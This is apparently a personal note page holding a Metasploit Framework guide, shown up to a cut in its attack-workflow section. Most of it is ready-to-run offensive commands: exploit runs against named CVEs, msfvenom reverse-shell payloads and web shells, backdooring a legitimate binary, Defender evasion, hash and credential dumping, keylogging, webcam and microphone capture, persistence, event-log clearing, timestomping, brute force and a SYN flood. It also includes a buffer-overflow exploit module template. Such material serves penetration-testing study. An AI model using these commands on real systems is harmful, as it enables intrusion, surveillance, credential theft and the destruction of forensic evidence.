Collection of hacking tools that allow hackers to fulfil their objectives
![[Pasted image 20260504210255.png]]

# Metasploit Multi/Handler

Tool for catching [[Reverse Shell]] and is the go-to when using staged payloads

# The Complete Metasploit Framework Guide

---

## 1. Introduction

**Metasploit** is the world's most widely used penetration testing framework, maintained by Rapid7. It provides a unified platform for discovering vulnerabilities, developing exploits, and executing post-exploitation activities.

### Key Features

- **Massive exploit database** — thousands of exploits for known CVEs
- **Modular architecture** — mix-and-match exploits, payloads, encoders, and auxiliary modules
- **Meterpreter** — a powerful in-memory post-exploitation agent
- **Database integration** — store hosts, services, vulnerabilities, and loot
- **Automation** — resource scripts for repeatable workflows

### Editions

|Edition|Description|
|---|---|
|**Metasploit Framework (MSF)**|Free, open-source, CLI-driven|
|**Metasploit Pro**|Commercial, adds web UI, automation, reporting|

This guide focuses on the free **Metasploit Framework**.

---

## 2. Installation & Setup

### Kali Linux (Pre-installed)

```bash
# Start/update on Kali
sudo apt update && sudo apt install metasploit-framework
msfconsole
```

### Ubuntu / Debian

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall
```

### macOS (via Homebrew)

```bash
brew install metasploit
```

### First-Time Setup

```bash
# Initialize the database (PostgreSQL required)
sudo msfdb init

# Verify DB connectivity
msfconsole -q
msf6 > db_status
# => [*] Connected to msf. Connection type: postgresql.

# Update Metasploit
sudo msfupdate
```

---

## 3. Architecture Overview

```
Metasploit Framework
├── Modules
│   ├── exploits/       # Code that takes advantage of vulnerabilities
│   ├── auxiliary/      # Scanners, fuzzers, DoS, brute-force tools
│   ├── post/           # Post-exploitation modules
│   ├── payloads/       # Code executed on the target
│   │   ├── singles/    # Self-contained (no stager needed)
│   │   ├── stagers/    # Set up a communication channel
│   │   └── stages/     # Downloaded by stager (e.g., Meterpreter)
│   ├── encoders/       # Obfuscate payloads to evade AV
│   ├── nops/           # NOP sled generators
│   └── evasion/        # AV/EDR evasion modules
├── Interfaces
│   ├── msfconsole      # Primary interactive console
│   ├── msfvenom        # Standalone payload generator
│   └── msfdb           # Database management CLI
└── Libraries
    ├── Rex             # Core library (networking, crypto, text)
    ├── MSF::Core       # Framework base classes
    └── MSF::Base       # Simplified API for module authors
```

---

## 4. The Metasploit Console (msfconsole)

### Launching

```bash
msfconsole          # Full startup with banner
msfconsole -q       # Quiet mode (no banner)
msfconsole -x "db_status; version"   # Run commands on launch
```

### Essential Navigation Commands

```
msf6 > help                  # Show all commands
msf6 > search <keyword>      # Search modules
msf6 > use <module_path>     # Load a module
msf6 > info                  # Show current module info
msf6 > back                  # Unload current module
msf6 > exit                  # Quit msfconsole
msf6 > version               # Show MSF version
msf6 > banner                # Show a random banner
```

### History & Shell

```
msf6 > history               # Show command history
msf6 > !ls                   # Run a shell command (! prefix)
msf6 > shell                 # Drop into a system shell
```

### Getting Help on a Module

```
msf6 exploit(ms17_010_eternalblue) > info
msf6 exploit(ms17_010_eternalblue) > show options
msf6 exploit(ms17_010_eternalblue) > show advanced
msf6 exploit(ms17_010_eternalblue) > show payloads
msf6 exploit(ms17_010_eternalblue) > show targets
```

---

## 5. Core Concepts

### Module Types

|Type|Purpose|Example Path|
|---|---|---|
|`exploit`|Exploits a vulnerability|`exploit/windows/smb/ms17_010_eternalblue`|
|`auxiliary`|Scanning, sniffing, fuzzing|`auxiliary/scanner/portscan/tcp`|
|`post`|Post-exploitation tasks|`post/windows/gather/hashdump`|
|`payload`|Code run on the target|`payload/windows/x64/meterpreter/reverse_tcp`|
|`encoder`|Obfuscates payloads|`encoder/x86/shikata_ga_nai`|
|`nop`|NOP sled generation|`nop/x86/single_byte`|
|`evasion`|AV/EDR evasion|`evasion/windows/windows_defender_exe`|

### Module Ranking

Modules are ranked by reliability:

|Rank|Description|
|---|---|
|`ExcellentRanking`|No service disruption expected|
|`GreatRanking`|Default target, minor service impact|
|`GoodRanking`|Works under common circumstances|
|`NormalRanking`|May cause service disruption|
|`AverageRanking`|Difficult to exploit consistently|
|`LowRanking`|Unreliable exploit|
|`ManualRanking`|Requires manual user interaction|

### Setting Options

```
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set RPORT 445
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# Set globally (persists across modules)
msf6 > setg LHOST 192.168.1.10
msf6 > setg LPORT 4444

# Unset options
msf6 > unset RHOSTS
msf6 > unsetg LHOST
```

### Running a Module

```
msf6 exploit(ms17_010_eternalblue) > run        # Run and wait
msf6 exploit(ms17_010_eternalblue) > exploit    # Alias for run
msf6 exploit(ms17_010_eternalblue) > exploit -j # Run as background job
msf6 exploit(ms17_010_eternalblue) > check      # Check if target is vulnerable (if supported)
```

---

## 6. Scanning & Reconnaissance

### Built-in Port Scanner

```
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(tcp) > set PORTS 22,80,443,445,3389
msf6 auxiliary(tcp) > set THREADS 50
msf6 auxiliary(tcp) > run
```

### Nmap Integration

Metasploit can import Nmap results directly into its database.

```bash
# Run Nmap and save XML
nmap -sV -O -oX scan_results.xml 192.168.1.0/24
```

```
# Import into MSF database
msf6 > db_import /path/to/scan_results.xml

# Or run Nmap directly from msfconsole
msf6 > db_nmap -sV -O 192.168.1.0/24

# Review discovered hosts and services
msf6 > hosts
msf6 > services
msf6 > services -p 445      # Filter by port
msf6 > vulns                # Show discovered vulnerabilities
```

### SMB Version Scanner

```
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(smb_version) > set THREADS 10
msf6 auxiliary(smb_version) > run
```

### HTTP Version Scanner

```
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(http_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(http_version) > set THREADS 20
msf6 auxiliary(http_version) > run
```

### SSH Version Scanner

```
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(ssh_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(ssh_version) > run
```

### Vulnerability Scanning

```
# SMB EternalBlue checker (MS17-010)
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(smb_ms17_010) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(smb_ms17_010) > run

# Log4Shell scanner (CVE-2021-44228)
msf6 > use auxiliary/scanner/http/log4shell_scanner
msf6 auxiliary(log4shell_scanner) > set RHOSTS 192.168.1.50
msf6 auxiliary(log4shell_scanner) > set TARGETURI /
msf6 auxiliary(log4shell_scanner) > run
```

---

## 7. Exploits

### Finding Exploits

```
# Search by keyword
msf6 > search eternalblue
msf6 > search type:exploit platform:windows smb

# Search by CVE
msf6 > search cve:2021-44228

# Search by name
msf6 > search name:ms17_010

# Filter by rank
msf6 > search type:exploit rank:excellent
```

### Example 1 — EternalBlue (MS17-010, CVE-2017-0144)

Targets Windows 7 / Server 2008 R2 with SMBv1 enabled.

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.1.10:4444
[*] Sending stage (200774 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.50:49163)

meterpreter >
```

### Example 2 — Apache Log4Shell (CVE-2021-44228)

```
msf6 > use exploit/multi/http/log4shell_header_injection
msf6 exploit(log4shell_header_injection) > set RHOSTS 192.168.1.100
msf6 exploit(log4shell_header_injection) > set RPORT 8080
msf6 exploit(log4shell_header_injection) > set LHOST 192.168.1.10
msf6 exploit(log4shell_header_injection) > set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(log4shell_header_injection) > exploit
```

### Example 3 — Unreal IRCd Backdoor

```
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unreal_ircd_3281_backdoor) > set RHOSTS 192.168.1.75
msf6 exploit(unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse
msf6 exploit(unreal_ircd_3281_backdoor) > set LHOST 192.168.1.10
msf6 exploit(unreal_ircd_3281_backdoor) > exploit
```

### Example 4 — vsftpd Backdoor (CVE-2011-2523)

```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.1.60
msf6 exploit(vsftpd_234_backdoor) > exploit
```

### Example 5 — Shellshock (CVE-2014-6271)

```
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(apache_mod_cgi_bash_env_exec) > set RHOSTS 192.168.1.80
msf6 exploit(apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/vulnerable.cgi
msf6 exploit(apache_mod_cgi_bash_env_exec) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(apache_mod_cgi_bash_env_exec) > set LHOST 192.168.1.10
msf6 exploit(apache_mod_cgi_bash_env_exec) > exploit
```

---

## 8. Payloads

Payloads define what happens on the target after the exploit succeeds.

### Payload Categories

|Category|Description|
|---|---|
|**Singles**|Standalone, self-contained (e.g., `cmd/unix/reverse`)|
|**Stagers**|Small initial code that sets up a channel (e.g., `/reverse_tcp`)|
|**Stages**|Full agent downloaded by a stager (e.g., `meterpreter`)|

### Payload Naming Convention

```
<platform>/<arch>/<stage>/<connection_type>

Examples:
  windows/x64/meterpreter/reverse_tcp
  linux/x86/shell/bind_tcp
  java/meterpreter/reverse_http
  php/meterpreter/reverse_tcp
  python/meterpreter/reverse_tcp
```

### Connection Types

|Type|Description|
|---|---|
|`reverse_tcp`|Target connects back to attacker over TCP|
|`reverse_https`|Target connects back over encrypted HTTPS|
|`bind_tcp`|Attacker connects to a listener on the target|
|`reverse_http`|Target connects back over HTTP|
|`reverse_tcp_allports`|Tries all ports on the attacker|

### Listing Available Payloads

```
msf6 exploit(ms17_010_eternalblue) > show payloads

Compatible Payloads
===================
   #   Name                                            ...
   0   generic/custom                                  ...
   1   generic/shell_bind_tcp                          ...
   2   generic/shell_reverse_tcp                       ...
   3   windows/x64/exec                                ...
   4   windows/x64/meterpreter/reverse_tcp             ...
   5   windows/x64/meterpreter/reverse_https           ...
   ...
```

### Common Payload Examples

```
# Windows Meterpreter over TCP (most common)
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Windows Meterpreter over HTTPS (evades basic firewalls)
set PAYLOAD windows/x64/meterpreter/reverse_https

# Linux shell
set PAYLOAD linux/x86/shell_reverse_tcp

# Linux Meterpreter
set PAYLOAD linux/x86/meterpreter/reverse_tcp

# Generic command shell (cross-platform)
set PAYLOAD cmd/unix/reverse_bash

# PHP Meterpreter (web shells)
set PAYLOAD php/meterpreter_reverse_tcp

# Python Meterpreter
set PAYLOAD python/meterpreter/reverse_tcp
```

---

## 9. Post-Exploitation

After gaining a session, post-exploitation modules gather intelligence, escalate privileges, and maintain persistence.

### Session Management

```
# List all active sessions
msf6 > sessions
msf6 > sessions -l        # Long listing

# Interact with a session
msf6 > sessions -i 1      # Interact with session 1

# Background the current session
meterpreter > background
# or press: Ctrl+Z

# Kill a session
msf6 > sessions -k 1
msf6 > sessions -K        # Kill all sessions
```

### Common Post-Exploitation Modules

#### Privilege Escalation

```
# Local privilege escalation suggester
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(local_exploit_suggester) > set SESSION 1
msf6 post(local_exploit_suggester) > run

# Windows privilege escalation - Bypass UAC
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 exploit(bypassuac_eventvwr) > set SESSION 1
msf6 exploit(bypassuac_eventvwr) > run
```

#### Credential Harvesting

```
# Dump Windows password hashes (requires SYSTEM)
msf6 > use post/windows/gather/hashdump
msf6 post(hashdump) > set SESSION 1
msf6 post(hashdump) > run

# Kerberos ticket harvesting
msf6 > use post/windows/gather/credentials/credential_collector

# Extract saved credentials from Windows Credential Manager
msf6 > use post/windows/gather/credentials/windows_autologin
```

#### Enumeration

```
# Enumerate all local users
msf6 > use post/windows/gather/enum_users_history

# Enumerate installed applications
msf6 > use post/windows/gather/enum_applications
msf6 post(enum_applications) > set SESSION 1
msf6 post(enum_applications) > run

# Enumerate network shares
msf6 > use post/windows/gather/enum_shares

# Gather system info (OS, patches, AV)
msf6 > use post/windows/gather/enum_system

# Linux enumeration
msf6 > use post/linux/gather/enum_system
msf6 > use post/linux/gather/enum_users_history
```

#### Persistence

```
# Windows persistence via registry
msf6 > use post/windows/manage/persistence_exe
msf6 post(persistence_exe) > set SESSION 1
msf6 post(persistence_exe) > set STARTUP REGISTRY
msf6 post(persistence_exe) > run

# SSH key persistence (Linux)
msf6 > use post/linux/manage/sshkey_persistence
msf6 post(sshkey_persistence) > set SESSION 1
msf6 post(sshkey_persistence) > run
```

#### Pivoting

```
# Add a route through a session (pivot to internal network)
msf6 > route add 10.10.10.0/24 1     # Route 10.10.10.0/24 via session 1
msf6 > route print                    # Print routing table
msf6 > route remove 10.10.10.0/24 1

# Auto-add routes from a session
msf6 > use post/multi/manage/autoroute
msf6 post(autoroute) > set SESSION 1
msf6 post(autoroute) > run

# SOCKS proxy for tool pivoting (e.g., proxychains)
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run -j
# Now use: proxychains nmap -sT 10.10.10.0/24
```

---

## 10. Meterpreter

Meterpreter is Metasploit's flagship payload — an advanced, in-memory agent that communicates over an encrypted channel and leaves minimal traces on disk.

### Core Commands

```
meterpreter > help                   # Show all commands
meterpreter > sysinfo                # System information
meterpreter > getuid                 # Current user
meterpreter > getpid                 # Current process ID
meterpreter > ps                     # List running processes
meterpreter > pwd                    # Print working directory
meterpreter > ls                     # List directory
meterpreter > cd C:\\Windows\\Temp   # Change directory
```

### File Operations

```
meterpreter > upload /local/file.exe C:\\Temp\\file.exe    # Upload file
meterpreter > download C:\\secret.txt /local/secret.txt    # Download file
meterpreter > cat C:\\Windows\\win.ini                      # Print file contents
meterpreter > edit C:\\Temp\\file.txt                       # Open file in editor
meterpreter > rm C:\\Temp\\file.txt                         # Delete file
meterpreter > mkdir C:\\Temp\\newdir                        # Make directory
meterpreter > search -f *.txt -d C:\\Users                  # Search for files
```

### Process Management

```
meterpreter > ps                     # List processes
meterpreter > kill 1234              # Kill a process by PID
meterpreter > migrate 1234           # Migrate to another process (stealth)
meterpreter > execute -f cmd.exe -i -H   # Execute a hidden interactive process
```

### Privilege Escalation

```
meterpreter > getsystem              # Attempt automatic privilege escalation
meterpreter > getuid                 # Confirm you are NT AUTHORITY\SYSTEM

# If getsystem fails, background and use a local exploit
meterpreter > background
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(local_exploit_suggester) > set SESSION 1
msf6 post(local_exploit_suggester) > run
```

### Credential Dumping

```
meterpreter > hashdump               # Dump local SAM hashes (requires SYSTEM)
meterpreter > run post/windows/gather/smart_hashdump
meterpreter > load kiwi              # Load Mimikatz-like credential module

# Kiwi commands (after load kiwi)
meterpreter > creds_all              # Dump all credential types
meterpreter > lsa_dump_sam           # Dump SAM database
meterpreter > lsa_dump_secrets       # Dump LSA secrets
meterpreter > golden_ticket_create   # Create Kerberos golden ticket
```

### Networking

```
meterpreter > ipconfig               # Network interfaces
meterpreter > route                  # Routing table
meterpreter > arp                    # ARP cache
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5   # Port forwarding
meterpreter > portfwd list           # List port forwards
meterpreter > portfwd delete -l 3389 # Delete a port forward
```

### Surveillance

```
meterpreter > screenshot             # Take a screenshot
meterpreter > screengrab             # Grab current screen
meterpreter > record_mic -d 30       # Record microphone for 30 seconds
meterpreter > webcam_snap            # Take a webcam photo
meterpreter > keyscan_start          # Start keylogger
meterpreter > keyscan_dump           # Dump captured keystrokes
meterpreter > keyscan_stop           # Stop keylogger
```

### Shell Access

```
meterpreter > shell                  # Drop into a native OS shell
# Press Ctrl+Z to background the shell, then type 'background' to return to meterpreter

# Upgrade a plain shell to Meterpreter
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(shell_to_meterpreter) > set SESSION 1
msf6 post(shell_to_meterpreter) > run
```

### Persistence & Cleanup

```
meterpreter > run persistence -X -i 5 -p 4444 -r 192.168.1.10
# -X = start at boot, -i = reconnect interval, -p = port, -r = attacker IP

meterpreter > clearev               # Clear Windows event logs (Application, System, Security)
meterpreter > timestomp C:\\Temp\\evil.exe -z "01/01/2019 12:00:00"  # Modify timestamps
```

---

## 11. Auxiliary Modules

Auxiliary modules do not exploit vulnerabilities directly — they support the engagement.

### Brute Force

```
# SSH brute force
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(ssh_login) > set RHOSTS 192.168.1.50
msf6 auxiliary(ssh_login) > set USER_FILE /usr/share/wordlists/users.txt
msf6 auxiliary(ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(ssh_login) > set THREADS 10
msf6 auxiliary(ssh_login) > set VERBOSE false
msf6 auxiliary(ssh_login) > run

# FTP brute force
msf6 > use auxiliary/scanner/ftp/ftp_login
msf6 auxiliary(ftp_login) > set RHOSTS 192.168.1.50
msf6 auxiliary(ftp_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/default_userpass.txt
msf6 auxiliary(ftp_login) > run

# SMB brute force
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(smb_login) > set RHOSTS 192.168.1.50
msf6 auxiliary(smb_login) > set SMBUser administrator
msf6 auxiliary(smb_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(smb_login) > run
```

### Network Sniffing

```
# ARP poisoning / man-in-the-middle
msf6 > use auxiliary/spoof/arp/arp_poisoning

# Network packet capture
msf6 > use auxiliary/sniffer/psnuffle
```

### Denial of Service (DoS)

```
# SYN flood
msf6 > use auxiliary/dos/tcp/synflood
msf6 auxiliary(synflood) > set RHOST 192.168.1.50
msf6 auxiliary(synflood) > set RPORT 80
msf6 auxiliary(synflood) > run
```

### Web Application Scanning

```
# Directory brute force
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(dir_scanner) > set RHOSTS 192.168.1.80
msf6 auxiliary(dir_scanner) > set DICTIONARY /usr/share/wordlists/dirb/common.txt
msf6 auxiliary(dir_scanner) > run

# Web login brute force
msf6 > use auxiliary/scanner/http/http_login
msf6 auxiliary(http_login) > set RHOSTS 192.168.1.80
msf6 auxiliary(http_login) > set AUTH_URI /admin/login
msf6 auxiliary(http_login) > set USERPASS_FILE /path/to/wordlist.txt
msf6 auxiliary(http_login) > run

# SQL injection scanner
msf6 > use auxiliary/scanner/http/blind_sql_query
```

### SNMP Enumeration

```
msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 auxiliary(snmp_enum) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(snmp_enum) > set COMMUNITY public
msf6 auxiliary(snmp_enum) > run
```

---

## 12. Encoders & Evasion

Encoders transform payloads to avoid signature-based detection by antivirus software.

### Using Encoders with msfvenom

```bash
# List available encoders
msfvenom --list encoders

# Encode a payload with shikata_ga_nai (x86 polymorphic)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \           # 5 iterations
  -f exe -o payload.exe

# Multiple encoders (chain them)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 \
  -e x86/xor_dynamic -i 2 \
  -f exe -o payload_encoded.exe
```

### Common Encoders

|Encoder|Architecture|Notes|
|---|---|---|
|`x86/shikata_ga_nai`|x86|Best for x86, polymorphic XOR additive feedback|
|`x64/xor`|x64|Basic XOR for 64-bit payloads|
|`x64/xor_dynamic`|x64|Dynamic XOR key for x64|
|`x86/alpha_mixed`|x86|Alphanumeric-only output|
|`x86/countdown`|x86|Countdown-based encoding|
|`cmd/powershell_base64`|cmd|Base64 encodes PowerShell payloads|

### Evasion Modules

```
# List evasion modules
msf6 > show evasion

# Windows Defender bypass
msf6 > use evasion/windows/windows_defender_exe
msf6 evasion(windows_defender_exe) > set FILENAME bypass.exe
msf6 evasion(windows_defender_exe) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 evasion(windows_defender_exe) > set LHOST 192.168.1.10
msf6 evasion(windows_defender_exe) > run
```

> **Note:** Modern EDR solutions use behaviour-based detection. Encoding alone is rarely enough against enterprise-grade security products. Techniques like process injection, reflective DLL loading, and AMSI bypass are needed in those scenarios.

---

## 13. MSFvenom

`msfvenom` is the standalone payload generator — combines the old `msfpayload` and `msfencode` tools.

### Basic Syntax

```bash
msfvenom -p <payload> [options] LHOST=<ip> LPORT=<port> -f <format> -o <output>
```

### Windows Payloads

```bash
# Windows x64 Meterpreter EXE (reverse TCP)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f exe -o win_shell.exe

# Windows x86 EXE (for older systems)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f exe -o win_shell_x86.exe

# Windows DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f dll -o malicious.dll

# PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.10 LPORT=443 \
  -f psh-reflection -o shell.ps1

# Windows service EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f exe-service -o svc_shell.exe
```

### Linux Payloads

```bash
# Linux x64 ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f elf -o linux_shell

chmod +x linux_shell

# Linux x86 ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f elf -o linux_shell_x86
```

### Web Payloads

```bash
# PHP webshell
msfvenom -p php/meterpreter_reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f raw -o shell.php

# ASP webshell
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f asp -o shell.asp

# ASPX webshell
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f aspx -o shell.aspx

# JSP webshell
msfvenom -p java/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f jsp -o shell.jsp
```

### Macro / Script Payloads

```bash
# VBA macro (for Office documents)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f vba -o macro.vba

# Python payload
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f raw -o shell.py

# Bash payload
msfvenom -p cmd/unix/reverse_bash \
  LHOST=192.168.1.10 LPORT=4444 \
  -f raw -o shell.sh
```

### Injecting into Existing Executables

```bash
# Inject payload into a legitimate binary (backdooring)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -x /path/to/putty.exe \      # Template binary
  -k \                          # Keep original functionality
  -f exe -o putty_backdoor.exe
```

### Setting Up a Handler

After generating a payload, start a listener in msfconsole:

```
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 192.168.1.10
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > set ExitOnSession false   # Keep listening for multiple connections
msf6 exploit(handler) > exploit -j               # Run as background job

[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 192.168.1.10:4444
```

---

## 14. Workspaces & Database

The Metasploit database stores hosts, services, credentials, and loot across engagements.

### Database Commands

```
msf6 > db_status              # Check database connection
msf6 > db_connect             # Connect to a database
msf6 > db_disconnect          # Disconnect
msf6 > db_rebuild_cache       # Rebuild module cache
```

### Workspaces

Workspaces separate different engagements in the same database.

```
msf6 > workspace              # List workspaces (* = current)
msf6 > workspace -a client1   # Add/switch to 'client1' workspace
msf6 > workspace client1      # Switch to workspace
msf6 > workspace -d client1   # Delete workspace
msf6 > workspace -r old new   # Rename workspace
```

### Hosts

```
msf6 > hosts                  # List all discovered hosts
msf6 > hosts -c address,os_name,purpose   # Custom columns
msf6 > hosts -S 192.168.1     # Search hosts
msf6 > hosts -d 192.168.1.50  # Delete a host
```

### Services

```
msf6 > services               # List all services
msf6 > services -p 80,443     # Filter by port
msf6 > services -s http       # Filter by service name
msf6 > services -u            # Show only 'up' services
```

### Credentials

```
msf6 > creds                  # List all captured credentials
msf6 > creds -u admin         # Filter by username
msf6 > creds -t password      # Filter by type
```

### Loot

```
msf6 > loot                   # List all captured loot (files, hashes, etc.)
```

### Importing & Exporting

```
# Import scan results
msf6 > db_import /path/to/nmap.xml
msf6 > db_import /path/to/nessus.nessus

# Export database
msf6 > db_export -f xml /path/to/export.xml
msf6 > db_export -f pwdump /path/to/hashes.txt
```

---

## 15. Resource Scripts

Resource scripts automate repetitive tasks by running sequences of msfconsole commands.

### Creating a Resource Script

```bash
# Create a simple automation script
cat > /tmp/autoexploit.rc << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set LHOST 192.168.1.10
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit -j
EOF
```

### Running a Resource Script

```bash
# From the command line
msfconsole -r /tmp/autoexploit.rc

# From within msfconsole
msf6 > resource /tmp/autoexploit.rc
```

### Example — Mass Scan & Exploit Script

```bash
cat > /tmp/full_scan.rc << 'EOF'
# Set global options
setg LHOST 192.168.1.10
setg LPORT 4444

# Nmap scan and import
db_nmap -sV -O --open -T4 192.168.1.0/24

# Check for EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Check for BlueKeep
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.0/24
run
EOF

msfconsole -r /tmp/full_scan.rc
```

### Example — Handler Resource Script

```bash
cat > /tmp/handler.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j -z
EOF
```

---

## 16. Writing Custom Modules

Metasploit modules are written in Ruby. Here's a minimal exploit module template:

### Module Structure

```
/usr/share/metasploit-framework/modules/
├── exploits/
│   └── custom/
│       └── my_exploit.rb
└── auxiliary/
    └── custom/
        └── my_scanner.rb
```

### Auxiliary Module Template

```ruby
##
# Custom Metasploit Auxiliary Module
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'My Custom Banner Grabber',
      'Description'    => %q{
        Connects to a TCP service and grabs the banner.
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     => [],
      'DisclosureDate' => '2024-01-01'
    ))

    register_options([
      Opt::RPORT(80),
      OptString.new('REQUEST', [true, 'HTTP request to send', "GET / HTTP/1.0\r\n\r\n"])
    ])
  end

  def run_host(ip)
    connect
    sock.put(datastore['REQUEST'])
    banner = sock.get_once(1024, 5)

    if banner
      print_good("#{ip} - Banner: #{banner.strip[0..100]}")
      report_service(host: ip, port: rport, proto: 'tcp', info: banner.strip[0..100])
    end
  rescue ::Rex::ConnectionRefused
    print_error("#{ip} - Connection refused")
  ensure
    disconnect
  end
end
```

### Exploit Module Template

```ruby
##
# Custom Metasploit Exploit Module
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'My Custom Buffer Overflow',
      'Description'    => %q{
        Exploits a buffer overflow in CustomApp 1.0.
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2024-XXXXX'],
        ['URL', 'https://example.com/advisory']
      ],
      'Payload'        => {
        'Space'    => 400,
        'BadChars' => "\x00\x0a\x0d"
      },
      'Targets'        => [
        ['CustomApp 1.0 on Windows x86', { 'Ret' => 0x7C874413 }]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2024-01-01',
      'Platform'       => 'win'
    ))

    register_options([
      Opt::RPORT(9999)
    ])
  end

  def exploit
    connect

    buf = "A" * 2006
    buf << [target.ret].pack('V')   # Overwrite EIP
    buf << make_nops(16)            # NOP sled
    buf << payload.encoded

    sock.put(buf)
    handler
    disconnect
  end
end
```

### Loading and Testing a Custom Module

```
# Copy module to MSF path
cp my_exploit.rb /usr/share/metasploit-framework/modules/exploits/custom/

# Reload modules in msfconsole
msf6 > reload_all

# Test the module
msf6 > use exploit/custom/my_exploit
msf6 > info
```

---

## 17. Common Attack Workflows

### Workflow 1 — Basic Network Penetration Test

```
# 1. Scan and enumerate
msf6 > db_nmap -sV -sC -O --open 192.168.1.0/24

# 2. Review results
msf6 > hosts
msf6 > services

# 3. Find vulnerable services
